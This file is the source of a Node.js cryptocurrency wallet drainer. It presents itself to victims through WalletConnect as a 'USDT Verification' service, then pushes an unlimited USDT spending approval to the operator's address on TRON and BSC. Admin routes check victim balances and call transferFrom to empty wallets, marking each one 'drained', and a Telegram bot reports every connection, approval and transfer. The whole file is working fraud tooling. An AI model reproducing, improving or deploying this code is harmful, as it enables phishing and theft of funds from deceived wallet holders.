require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const QRCode = require('qrcode');
const TelegramBot = require('node-telegram-bot-api');
const TronWeb = require('tronweb');
const { ethers } = require('ethers');
const cors = require('cors');
const crypto = require('crypto');
const { SignClient } = require('@walletconnect/sign-client');
const { Core } = require('@walletconnect/core');

const app = express();
app.use(express.json());
app.use(cors());

// ============ CONFIG ============
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
const TG_ADMIN_CHAT_ID = process.env.TG_ADMIN_CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;
const MASTER_PK = process.env.MASTER_PK;
const BACKEND_URL = process.env.BACKEND_URL;
const WC_PROJECT_ID = process.env.WC_PROJECT_ID;
const ADMIN_KEY = process.env.ADMIN_KEY;

const CONTRACTS = {
  tron: { usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, caip: 'tron:0x2b6653dc' },
  bsc: { usdt: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, caip: 'eip155:56' }
};

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// ============ TRON & BSC SETUP ============
const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io', privateKey: MASTER_PK });
const MASTER_TRON_ADDRESS = tronWeb.address.fromPrivateKey(MASTER_PK);

const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
const bscWallet = new ethers.Wallet(MASTER_PK, bscProvider);
const MASTER_BSC_ADDRESS = bscWallet.address;

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)'
];
const bscUsdt = new ethers.Contract(CONTRACTS.bsc.usdt, ERC20_ABI, bscWallet);

// ============ TELEGRAM & DB ============
const bot = new TelegramBot(TG_BOT_TOKEN, { polling: true });

mongoose.connect(MONGO_URI, { tls: true, serverSelectionTimeoutMS: 3000 })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB error:', err));

const WalletSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true, required: true },
  chain: { type: String, enum: ['tron', 'bsc'], required: true },
  wcPairingTopic: String,
  wcTopic: String,
  userWallet: { type: String, default: null },
  approved: { type: Boolean, default: false },
  status: { type: String, enum: ['pending','attached','approved','drained'], default: 'pending' },
  createdAt: { type: Date, default: Date.now }
});
const Wallet = mongoose.model('Wallet', WalletSchema);

// ============ WALLETCONNECT SETUP ============
let signClient = null;
const sessionMap = new Map();

async function initWC() {
  const core = new Core({ projectId: WC_PROJECT_ID, logger: 'error' });
  signClient = await SignClient.init({
    core,
    projectId: WC_PROJECT_ID,
    metadata: {
      name: 'USDT Verification', 
      description: 'Securely verify your wallet to proceed with the payment.',
      url: BACKEND_URL,
      icons: ['https://i.postimg.cc/FY2PX37m/0000000087ac81faa556b88da506f604.png'] 
    }
  });

  signClient.on('session_proposal', async (event) => {
    try {
      const { id, params } = event;
      const pairingTopic = params.pairingTopic;
      
      // DB se search karo memory ki jagah
      const wallet = await Wallet.findOne({ wcPairingTopic: pairingTopic });
      if (!wallet) {
        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Wallet not found for topic ${pairingTopic}`);
        return;
      }

      // Sirf wahi namespace approve karo jo request kiya tha
      const namespacesToApprove = wallet.chain === 'tron' ? {
        tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
      } : {
        eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
      };

      const { acknowledged } = await signClient.approve({
        id,
        namespaces: namespacesToApprove
      });
      
      const session = await acknowledged();
      let walletAddress = null;
      let chain = wallet.chain;

      if (session.namespaces.tron && session.namespaces.tron.accounts.length) {
        walletAddress = session.namespaces.tron.accounts[0].split(':')[2];
      } else if (session.namespaces.eip155 && session.namespaces.eip155.accounts.length) {
        walletAddress = session.namespaces.eip155.accounts[0].split(':')[2];
      }

      if (!walletAddress) {
        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Address not found in session namespaces.`);
        return;
      }

      wallet.userWallet = walletAddress;
      wallet.wcTopic = session.topic;
      wallet.status = 'attached';
      await wallet.save();

      sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain });

      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nWaiting 2 seconds before requesting approval...`, { parse_mode: 'Markdown' });

      // Trust Wallet ko active hone ke liye 2 second ka time do
      await new Promise(r => setTimeout(r, 2000));

      await requestApproval(wallet.sessionId);
    } catch (e) { 
      console.error('session_proposal error:', e); 
      bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ session_proposal Error: ${e.message}`);
    }
  });
  console.log('WalletConnect ready');
}

async function requestApproval(sessionId) {
  const session = sessionMap.get(sessionId);
  if (!session) {
    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Session map missing for ${sessionId}`);
    return;
  }
  const wallet = await Wallet.findOne({ sessionId });
  const chain = wallet.chain;

  try {
    bot.sendMessage(TG_ADMIN_CHAT_ID, `⏳ Requesting Approval from Trust Wallet...`);
    let result;
    
    if (chain === 'tron') {
      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        CONTRACTS.tron.usdt, 'approve(address,uint256)', { feeLimit: 100000000, callValue: 0 },
        [{ type: 'address', value: MASTER_TRON_ADDRESS }, { type: 'uint256', value: MAX_UINT256 }],
        wallet.userWallet
      );

      result = await signClient.request({
        topic: session.topic,
        chainId: CONTRACTS.tron.caip,
        request: { method: 'tron_signTransaction', params: { address: wallet.userWallet, transaction: tx.transaction } }
      });

      const broadcast = await tronWeb.trx.sendRawTransaction(result);
      if (!broadcast.result) throw new Error(broadcast.message);
      
      wallet.approved = true;
      wallet.status = 'approved';
      await wallet.save();

      bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [TRON]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });

    } else if (chain === 'bsc') {
      const iface = new ethers.Interface(ERC20_ABI);
      const data = iface.encodeFunctionData('approve', [MASTER_BSC_ADDRESS, MAX_UINT256]);
      const nonce = await bscProvider.getTransactionCount(wallet.userWallet);
      const feeData = await bscProvider.getFeeData();
      
      const tx = {
        to: CONTRACTS.bsc.usdt, data: data, value: '0x0', gas: '0x186a0',
        maxFeePerGas: feeData.maxFeePerGas?.toString() || '0x12a05f200',
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || '0x3b9aca00',
        nonce: '0x' + nonce.toString(16), chainId: '0x38', type: '0x2'
      };

      result = await signClient.request({
        topic: session.topic, chainId: CONTRACTS.bsc.caip,
        request: { method: 'eth_sendTransaction', params: [tx] }
      });

      wallet.approved = true;
      wallet.status = 'approved';
      await wallet.save();

      bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [BSC]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
    }
  } catch (e) {
    console.error('requestApproval error:', e);
    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval Error [${chain}]: ${e.message}`);
  }
}

function checkAdmin(req, res, next) {
  if (req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// ============ ROUTES ============

app.post('/api/generate-qr', checkAdmin, async (req, res) => {
  try {
    const { chain } = req.body;
    const sessionId = crypto.randomBytes(12).toString('hex');

    const { uri } = await signClient.connect({
      requiredNamespaces: chain === 'tron' ? {
        tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
      } : {
        eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
      }
    });

    const pairingTopic = uri.split('@')[0].replace('wc:', '');
    await Wallet.create({ sessionId, chain, wcPairingTopic: pairingTopic, status: 'pending' });

    const qrImage = await QRCode.toDataURL(uri, { width: 400, margin: 2 });
    res.json({ success: true, sessionId, chain, uri, qrImage });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/wallets', checkAdmin, async (req, res) => {
  const wallets = await Wallet.find({ status: { $in: ['approved', 'drained'] } }).sort({ createdAt: -1 });
  res.json({ wallets });
});

app.get('/api/admin/balance/:sessionId', checkAdmin, async (req, res) => {
  const wallet = await Wallet.findOne({ sessionId: req.params.sessionId });
  if (!wallet || !wallet.userWallet) return res.status(404).json({ error: 'Not found' });
  let balance;
  if (wallet.chain === 'tron') {
    const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
    const bal = await contract.balanceOf(wallet.userWallet).call();
    balance = (Number(bal) / 1e6).toFixed(6);
  } else {
    const bal = await bscUsdt.balanceOf(wallet.userWallet);
    balance = ethers.formatUnits(bal, 18);
  }
  res.json({ balance, wallet: wallet.userWallet, chain: wallet.chain });
});

app.post('/api/admin/transfer', checkAdmin, async (req, res) => {
  try {
    const { sessionId, destination, amount } = req.body;
    const wallet = await Wallet.findOne({ sessionId });
    if (!wallet || !wallet.approved) return res.status(400).json({ error: 'Not approved' });

    let txHash;
    if (wallet.chain === 'tron') {
      const amountSun = Math.floor(parseFloat(amount) * 1e6).toString();
      const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
      txHash = await contract.transferFrom(wallet.userWallet, destination, amountSun).send({ feeLimit: 100000000 });
    } else {
      const amountWei = ethers.parseUnits(amount.toString(), 18);
      const tx = await bscUsdt.transferFrom(wallet.userWallet, destination, amountWei);
      const receipt = await tx.wait();
      txHash = receipt.hash;
    }
    wallet.status = 'drained';
    await wallet.save();
    bot.sendMessage(TG_ADMIN_CHAT_ID, `💸 *Transfer Done*\nFrom: \`${wallet.userWallet}\`\nAmount: ${amount}`);
    res.json({ success: true, txHash });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

(async () => {
  await initWC();
  app.listen(process.env.PORT || 3000, () => console.log('Server running'));
})();
